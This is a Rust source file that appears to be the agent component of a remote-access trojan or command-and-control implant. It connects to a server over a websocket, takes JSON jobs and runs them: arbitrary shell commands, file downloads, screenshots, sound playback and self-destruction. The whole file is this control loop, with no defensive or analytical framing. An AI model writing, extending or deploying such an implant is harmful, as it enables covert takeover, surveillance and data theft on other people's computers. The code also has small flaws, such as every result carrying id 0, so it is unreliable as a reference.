use std::collections::HashMap;
use std::sync::Arc;

use futures_util::{
    SinkExt,
    stream::{SplitSink, SplitStream},
    StreamExt,
};
use lazy_static::lazy_static;
use tokio::{
    net::TcpStream,
    sync::RwLock,
    task::JoinHandle,
    time::timeout};
use tokio::sync::Mutex;
use tokio_tungstenite::{
    MaybeTlsStream,
    tungstenite::{Error as TungstenError, Message},
    WebSocketStream,
};

use common::api::{Job, JobOutput, JobResult, JobType};
use common::errors::JobErrors::TimeOut;
use executors::{
    command::execute_command,
    download::download_file,
    playsound::play_sound,
    screenshot::screenshot,
    selfdestruct::selfdestruct,
};

type Handle = JoinHandle<()>;
type MutexSender = Arc<Mutex<SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>>>;
type Receiver = SplitStream<WebSocketStream<MaybeTlsStream<TcpStream>>>;

lazy_static! {
    static ref JOBS: RwLock<HashMap<u16, Handle>> = RwLock::new( HashMap::new());
}

pub(super) async fn run(socket: WebSocketStream<MaybeTlsStream<TcpStream>>) -> Result<(), TungstenError> {
    let (sender, mut receiver) = socket.split();
    let mutex = Arc::new(Mutex::new(sender));
    loop {
        let job = receive(&mut receiver).await?;
        let job_id = job.id;
        let thread = tokio::spawn(execute_timeout(job, mutex.clone()));
        JOBS.write().await.insert(job_id, thread);
    }
}

async fn receive(receiver: &mut Receiver) -> Result<Job, TungstenError> {
    let message = match receiver.next().await {
        Some(message) => message?,
        None => return Err(TungstenError::ConnectionClosed),
    };

    let job = match process_message(message).await {
        Ok(message) => { message }
        Err(e) => {
            return match e {
                TungstenError::ConnectionClosed => { Err(TungstenError::ConnectionClosed) }
                TungstenError::Utf8 => { Err(TungstenError::Utf8) }
                _ => { unreachable!("Wrong TungstenError") }
            };
        }
    };

    let job: Job = serde_json::from_str(&job).unwrap();
    Ok(job)
}

async fn execute(mut sender_arc: MutexSender, job: Job) -> Result<(), TungstenError> {
    let output = pick_executor(&job.job_type).await;

    let result = JobResult {
        job_output: Ok(output),
        id: 0,
    };

    send(&mut sender_arc, result).await?;

    Ok(())
}

async fn send(sender: &mut MutexSender, job_result: JobResult) -> Result<(), TungstenError> {
    sender.lock().await.send(Message::Text(serde_json::to_string(&job_result).unwrap())).await?;
    Ok(())
}

async fn pick_executor(job_type: &JobType) -> JobOutput {
    match job_type {
        JobType::Command(p) => { execute_command(p).await }
        JobType::DownloadFile(p) => { download_file(p).await }
        JobType::PlaySound(p) => { play_sound(p).await }
        JobType::ScreenShot => { screenshot().await }
        JobType::SelfDestruct => { selfdestruct().await }
    }
}

async fn process_message(msg: Message) -> Result<String, TungstenError> {
    match msg {
        Message::Text(t) => {
            Ok(t)
        }
        Message::Close(_) => {
            Err(TungstenError::ConnectionClosed)
        }
        Message::Frame(_) => {
            unreachable!("This is never supposed to happen")
        }
        _ => { Err(TungstenError::Utf8) }
    }
}

async fn execute_timeout(job: Job, mut sender: MutexSender) {
    match timeout(job.timeout, execute(sender.clone(), job)).await {
        Ok(e) => {
            match e {
                Ok(_) => { println!("nice") }
                Err(e) => { println!("{:#?}", e) }
            }
        }
        Err(_) => {
            send(&mut sender, JobResult {
                id: 0,
                job_output: Err(TimeOut),
            }).await.unwrap();
        }
    }
}